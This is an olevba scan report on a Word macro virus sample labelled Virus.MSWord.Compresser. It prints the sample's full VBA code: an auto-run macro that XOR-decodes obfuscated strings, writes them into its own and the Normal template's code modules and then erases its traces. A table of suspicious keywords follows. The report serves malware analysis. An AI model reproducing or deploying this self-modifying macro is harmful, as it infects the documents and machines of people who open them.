olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Compresser-311eb4a9d418b28ed0e9e7e2e5f0a59a700ca26f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Compresser-311eb4a9d418b28ed0e9e7e2e5f0a59a700ca26f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub autoopen()
Dim j(100) As String
j(0) = "-е+е¬е¦="
j(1) = "-еTе¬е¦="
j(2) = "-еLе¬е+="
j(3) = "ш№цъсре¬еLLн+йеLгм"
j(4) = "¦е¦"
j(5) = "-е¬ен+и+м"
j(6) = "Lе¬ен+и+м"
j(7) = "+е¬ен+и+м"
j(8) = "Tге¬еT"
j(9) = "T¦е¬ен+и+м"
j(10) = "TLе¬ен+и+м"
j(11) = "TTе¬ен+и+м"
j(12) = "-"
j(13) = "¦е+"
j(14) = "¦е+йег"
j(15) = "¦еш№цъср"
j(16) = "-"
j(17) = "¦еT"
j(18) = "¦е+йег"
j(19) = "¦еш№цъср"
j(20) = "-"
j(21) = "¦лЎфєрфЎе¦-"
Set This = ThisDocument: Set VBP = This.VBProject
Set VBC = VBP.VBCOMPONENTS(1): Set COD = VBC.CODEMODULE
For I = 0 To 21
decode = decode & Dec(Decrypt(j(I))) & vbCr
Next
COD.InsertLines 79, decode
Call compressed
NormalTemplate.VBProject.VBCOMPONENTS(1).CODEMODULE.DELETELINES 79, 23
ActiveDocument.VBProject.VBCOMPONENTS(1).CODEMODULE.DELETELINES 79, 23
Rem WM97.COMPRESSED
End Sub
Private Function Dec(s)
H1 = "": D = ""
For I = 1 To Len(s)
H1 = Mid(s, I, 1)
Select Case H1
Case "A": H1 = Decrypt("гLT")
Case "B": H1 = Decrypt("T¦+L-гTLL-г-TL")
Case "C": H1 = Decrypt("-¦T¦LL+¦¦¦LLTT")
Case "D": H1 = Decrypt("T=¦г+¦¦¦LLTT")
Case "E": H1 = Decrypt("T=г")
Case "F": H1 = Decrypt("T¦+")
Case "G": H1 = Decrypt("+¦¦")
Case "H": H1 = Decrypt("лL¦-+¦¦L¦TлL¦¦¦L-¦TLTTгн+мл¦¦+LL¦+¦гL")
Case "I": H1 = Decrypt("л-++++¦LгT+¦TT")
Case "J": H1 = Decrypt("л+LгLTLг¦TLг")
Case "K": H1 = Decrypt("л¦TгL+Tг¦TLг")
Case "L": H1 = Decrypt("л¦¦¦TT¦+г¦TLг")
Case "M": H1 = Decrypt("лг¦TLг")
Case "N": H1 = Decrypt("л---г¦¦-T¦¦T")
Case "O": H1 = Decrypt("¦-T¦¦Tг")
Case "P": H1 = Decrypt("лL¦+¦г-+¦TL¦T¦¦T")
Case "Q": H1 = Decrypt("лг-LLT¦+L-г-+¦L-T")
Case "R": H1 = Decrypt("л¦¦T+¦+L¦¦TLL+г¦¦Tг")
Case "S": H1 = Decrypt("л+¦г-г---гL+Tг")
Case "T": H1 = Decrypt("T+-гL+TгT¦TL")
Case "U": H1 = Decrypt("лг¦+LLT¦-+-T¦TT")
Case "V": H1 = Decrypt("л+¦г-г--гT-T¦г¦-+")
Case "W": H1 = Decrypt("лLT-¦гL¦-T¦Lг+L-")
Case "X": H1 = Decrypt("T¦T=")
Case "Y": H1 = Decrypt("LT+еT¦T=")
Case "Z": H1 = Decrypt("л+¦ггT-LL")
End Select
D = D & H1
Next
Dec = D
End Function
Private Function Decrypt(s)
For I = 1 To Len(s)
Decrypt = Decrypt & Chr(Asc(Mid(s, I, 1)) Xor 133)
Next
End Function

Private Sub compressed()

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoopen            |Runs when the Word document is opened        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBCOMPONENTS        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CODEMODULE          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+
